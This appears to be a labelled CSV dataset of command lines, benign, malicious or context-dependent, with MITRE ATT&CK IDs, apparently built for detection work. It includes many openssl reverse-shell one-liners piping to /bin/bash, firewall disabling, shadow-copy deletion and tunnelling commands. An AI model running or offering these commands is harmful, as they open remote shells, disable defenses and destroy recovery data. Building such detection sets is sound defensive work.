command,label,original_label,mitre_id
sshuttle -r jenkins@10.0.0.50 0/0,Context_Dependent,Synthetic,Synthetic
pdfattach [-h|--help],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:9002,Malicious,Synthetic,Synthetic
sudo prosodyctl status,Benign,Benign,Benign
"(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]""$_"").gPlink){Write-Host ""[+] OU Path:""([ADSI]""$_"").Path;$a=((([ADSI]""$_"").gplink) -replace ""[[;]"" -split ""]"");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host ""Policy Path[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host ""Policy Name[$i]:""([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output ""`n"" }}",Context_Dependent,Malicious,T1087
sudo gpm -m path/to/mouse_device -t mouse_type -R,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:9090,Malicious,Synthetic,Synthetic
sudo squid -k reconfigure,Benign,Benign,Benign
"{{echo -n '{""name"":""My Folder1""}' | base64}} | bw create folder",Benign,Benign,Benign
"sudo echo ""deb http://downloads-distro.mongodb.org/repo/ubuntu-upstart dist 10gen"" | sudo tee -a /etc/apt/sources.list.d/10gen.list",Benign,Benign,Benign
st-flash erase,Benign,Benign,Benign
chgrp,Benign,Benign,Benign
ssh -w 0:0 svcuser@10.0.0.8,Context_Dependent,Synthetic,Synthetic
"csvsql --insert --db ""mysql://user:password@host/database"" data.csv",Benign,Benign,Benign
pnmremap [-ma|-mapfile] path/to/palette_file.ppm path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
env DISPLAY=`hostname`:0 skype,Benign,Benign,Benign
iperf [-u|--udp] [-s|--server] [-p|--port] 5001,Benign,Benign,Benign
gops tree,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:53,Malicious,Synthetic,Synthetic
find -type d -print0|xargs -0 chmod 644,Benign,Benign,Benign
bandwhich [-a|--addresses],Benign,Benign,Benign
"git log [-n|--max-count] n --author ""author""",Benign,Benign,Benign
tcpdump -i ens33 -c 445,Context_Dependent,Synthetic,Synthetic
"Write-Host ""End of bruteforce""",Malicious,Malicious,T1110
darkhttpd path/to/docroot --port port,Benign,Benign,Benign
Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=$uac_prop)' -Server $domain,Context_Dependent,Malicious,T1087
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
tcpdump -i ens33 -w /tmp/.job,Context_Dependent,Synthetic,Synthetic
tracepath 192.168.1.1,Context_Dependent,Synthetic,Synthetic
"zip --password ""$encryption_password"" $test_folder/$test_file ./*",Malicious,Malicious,T1560
meteor add package,Benign,Benign,Benign
proxify,Benign,Benign,Benign
Enable-PnpDevice -InstanceId 'RETRIEVED USING Get-PnpDevice COMMAND',Benign,Benign,Benign
immich-go -server=server_url -key=server_key tool album delete {{\d{4}-\d{2}-\d{2}}},Benign,Benign,Benign
clamscan [-d|--database] path/to/database_file_or_directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:3306,Malicious,Synthetic,Synthetic
wikit topic [-l|--lang] language_code,Benign,Benign,Benign
scamper -i 192.0.2.1,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:8888,Malicious,Synthetic,Synthetic
tldr reg save|restore|load|unload,Benign,Benign,Benign
goku,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
ls -a >> $output_file,Context_Dependent,Malicious,T1083
xxd input_file output_file,Benign,Benign,Benign
crypto key zeroize,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
sockstat -G gid|group,Benign,Benign,Benign
who | awk -F' ' '{print $1}' | sort -u | wc -l,Context_Dependent,Benign,Benign
GetNPUsers.py domain/username -hashes LM_Hash:NT_Hash -usersfile path/to/userslist -dc-ip domain_controller_ip,Benign,Benign,Benign
atop -m,Benign,Benign,Benign
tcpdump -i eth0 host 10.0.0.10,Context_Dependent,Synthetic,Synthetic
tcpdump -i ens33 port 9001,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
twm [-s|-single],Benign,Benign,Benign
"write-output ""------------""| out-file $output_file -append",Context_Dependent,Malicious,T1012
sudo aa-cleanprof [-s|--silent] profile_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:9002,Malicious,Synthetic,Synthetic
qutebrowser --set content.geolocation true|false,Benign,Benign,Benign
gvpack path/to/layout1.gv path/to/layout2.gv ... > path/to/output.gv,Benign,Benign,Benign
dtrx --overwrite path/to/file,Benign,Benign,Benign
sudo code --user-data-dir path/to/directory,Benign,Benign,Benign
Set-AzureADUserPassword -ObjectId $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue,Malicious,Malicious,T1098
timetrap edit --end time,Benign,Benign,Benign
find . -amin 10,Benign,Benign,Benign
getent passwd 1000,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:995,Malicious,Synthetic,Synthetic
pnmcolormap [-splits|-splitspread] n_colors path/to/input.pnm > path/to/output.ppm,Benign,Benign,Benign
c99 file.c file.o,Benign,Benign,Benign
vagrant reload --provision,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openfortivpn [-u|--username] username [-p|--password] password,Benign,Benign,Benign
rpi-imager --cli --disable-verify path/to/image.zip /dev/sdX,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.25:80,Malicious,Synthetic,Synthetic
shopt nullglob,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:110,Malicious,Synthetic,Synthetic
pnmtofiasco [-q|--quality] quality_level path/to/file.pnm > path/to/file.fiasco,Benign,Benign,Benign
standard-version --dry-run,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:143 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:9002,Malicious,Synthetic,Synthetic
find /home/mywebsite/public_html/sites/all/modules -type f -exec chmod 640 {} +,Context_Dependent,Benign,Benign
diff -u file1 file2,Benign,Benign,Benign
ipscan 192.168.0.1-254 -o path/to/output.txt,Benign,Benign,Benign
compopt -o|+o option1 -o|+o option2,Benign,Benign,Benign
mytop [-u|-user] user -prompt,Benign,Benign,Benign
ipconfig /release adapter,Benign,Benign,Benign
"& ""PathToAtomicsFolder\T1027.006\bin\T1027_006_remote.html""",Malicious,Malicious,T1027
qtchooser --list-versions,Benign,Benign,Benign
pamditherbw -fs|atkinson|thresholding [-va|-value] 0.3 path/to/image.pgm > path/to/file.pgm,Benign,Benign,Benign
flutterfire configure,Benign,Benign,Benign
pw-profiler [-r|--remote] remote_name,Benign,Benign,Benign
"mlr --prepipe 'gunzip' [-c|--csv] filter [-S|--infer-none] '$fieldName =~ ""regex""' example.csv.gz",Benign,Benign,Benign
ng [t|test] --browsers firefox|webkit|chromium,Benign,Benign,Benign
git symbolic-ref [-d|--delete] refs/name,Benign,Benign,Benign
"echo ""# THIS IS A COMMENT"" >> /etc/ufw/ufw.conf",Malicious,Malicious,T1562
CommandLine = $CommandLine,Malicious,Malicious,T1218
pdfjam path/to/file1.pdf last-1 path/to/file2.pdf last-1 ... --suffix reversed,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.25:995 root@staging.lab,Context_Dependent,Synthetic,Synthetic
sensible-editor +10 path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
pio device list,Benign,Benign,Benign
echo 'ls -hal /root/ > /root/test.out' | sudo bash,Benign,Benign,Benign
fluxctl list-images,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
tcpdump -i ens33 port 4444,Context_Dependent,Synthetic,Synthetic
pipes.sh -v,Benign,Benign,Benign
setfont,Benign,Benign,Benign
pkgfile --repo repository_name filename,Benign,Benign,Benign
tcpdump -i ens160 -n,Context_Dependent,Synthetic,Synthetic
mktemp -d,Benign,Benign,Benign
login -h host user,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.10:9001 audit@10.10.10.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:1433,Malicious,Synthetic,Synthetic
rsync -a --include='*/' --exclude='*' source/ destination/,Benign,Benign,Benign
hexdump -C path/to/file,Benign,Benign,Benign
knock [-u|--udp] hostname portnumber,Benign,Benign,Benign
find /path/to/search -type l -xtype l,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:22,Malicious,Synthetic,Synthetic
mocha [-R|--reporter] reporter,Benign,Benign,Benign
"getent passwd | cut -d: -f1 | perl -e'while(<>){chomp;$l = `crontab -u $_ -l 2>/dev/null`;print ""$_\n$l\n"" if $l}'",Context_Dependent,Benign,Benign
ssh -fN -L 8080:10.0.0.100:8443 user@10.0.0.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:9090,Malicious,Synthetic,Synthetic
history -r /path/to/input-file,Context_Dependent,Malicious,T1005
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
"bind '""\e[24~"":""\C-k \C-upwd\n""'",Benign,Benign,Benign
idevicebackup2 restore path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
minidlna -f path/to/minidlna.conf,Benign,Benign,Benign
if exist path\to\file (echo Condition is true),Benign,Benign,Benign
nix-shell [-p|--packages] package1 package2 ... [-I|--include] nixpkgs=https://github.com/NixOS/nixpkgs/archive/nixpkgs_revision.tar.gz,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:1433,Malicious,Synthetic,Synthetic
"find . -name ""*.png"" -prune -o -name ""*.gif"" -prune -o -name ""*.svn"" -prune -o -print0 | xargs -0 -I FILES grep -IR ""foo="" FILES",Benign,Benign,Benign
fly [-t|--target] target_name pipelines,Benign,Benign,Benign
ls /home/ABC/files/*.csv | rev | cut -d/ -f1 | rev,Context_Dependent,Benign,Benign
"find . -type f -name ""*.php"" -exec grep --with-filename -c ""^use "" {} \; | sort -t "":"" -k 2 -n -r",Benign,Benign,Benign
unset array[`shuf -i 0-4 -n1`];,Benign,Benign,Benign
photo_high_resj.png,Malicious,Malicious,T1036
kubectl set [sa|serviceaccount] [deploy|deployment]/deployment_name service_account_name,Benign,Benign,Benign
pnmtotiffcmyk path/to/input_file.pnm > path/to/output_file.tiff,Benign,Benign,Benign
bpkg run command argument1 argument2 ...,Benign,Benign,Benign
"mkdir ""c:\Temp""",Malicious,Malicious,T1105
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8443,Malicious,Synthetic,Synthetic
csshX cluster1,Benign,Benign,Benign
w | awk '{print $1}' | xargs -I '{}' id '{}',Context_Dependent,Benign,Benign
perlbrew list-modules,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:80,Malicious,Synthetic,Synthetic
"find /var -type f -exec grep ""param1"" {} \; -print",Benign,Benign,Benign
scrun start container_id,Benign,Benign,Benign
vnstati --summary --iface network_interface --output path/to/output.png,Benign,Benign,Benign
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f",Malicious,Malicious,T1562
openssl s_client -quiet -connect 192.168.1.25:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
find . -name test,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:8080,Malicious,Synthetic,Synthetic
npm exec /bin/sh,Malicious,Malicious,T1059
scan-build,Benign,Benign,Benign
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe},Malicious,Malicious,T1216
sshuttle -r operator@10.0.0.50 0/0,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:8081,Malicious,Synthetic,Synthetic
tcpdump -i ens33 -w /tmp/.upd,Context_Dependent,Synthetic,Synthetic
"kill `pstree -p 24901 | sed 's/(/\n(/g' | grep '(' | sed 's/(\(.*\)).*/\1/' | tr ""\n"" "" ""`",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:443,Malicious,Synthetic,Synthetic
find . -type f -printf '%P\n' > outputfile,Benign,Benign,Benign
pytest -m marker_name1 and not marker_name2,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
hunspell path/to/file,Benign,Benign,Benign
ssh -fN -L 8080:172.16.5.20:80 operator@update.bad,Context_Dependent,Synthetic,Synthetic
find . -type f -newerat 2008-09-29 ! -newerat 2008-09-30,Benign,Benign,Benign
curl http://www.example.com --proxy http://125.119.175.48:8909,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9090,Malicious,Synthetic,Synthetic
vssadmin delete shadows /all /quiet,Malicious,Malicious,T1490
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
phpcbf -i,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:9090 user@10.0.0.1,Context_Dependent,Synthetic,Synthetic
pnputil /add-driver path\to\folder\*.inf /subdirs,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.25:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.50:4445,Malicious,Synthetic,Synthetic
"find dir1 dir2 dir3 -type f -name ""*.java"" -exec grep -il 'foo' {} \;",Benign,Benign,Benign
minio server node1_hostname path/to/data_directory node2_hostname path/to/data_directory,Benign,Benign,Benign
$conn.bind(),Malicious,Malicious,T1110
sfdk maintain,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
"$sheet.Cells.Item(17,1) = ""=FWRITELN(A5, `""oStream.Close`"")""",Malicious,Malicious,T1204
"rgpt --json --i ""$(git diff path/to/file)""",Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:110 audit@192.168.1.254,Context_Dependent,Synthetic,Synthetic
systemd-notify --ready,Benign,Benign,Benign
dex [-a|--autostart],Benign,Benign,Benign
top -bn1 | head -20,Context_Dependent,Synthetic,Synthetic
strace -p 9090,Context_Dependent,Synthetic,Synthetic
uname -s -r -v,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
schroot --all command,Benign,Benign,Benign
"find / -maxdepth 1 -xdev -type f -exec grep -Zli ""stringtofind"" {} + | parallel -0 sed ""'/./d'"" '{}'",Context_Dependent,Benign,Benign
crane auth logout registry_address [-h|--help],Benign,Benign,Benign
locale [-a|--all-locales],Benign,Benign,Benign
php -S 0.0.0.0:80,Malicious,Malicious,T1105
asciidoctor path/to/file.adoc,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.10:5432 support@10.10.10.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
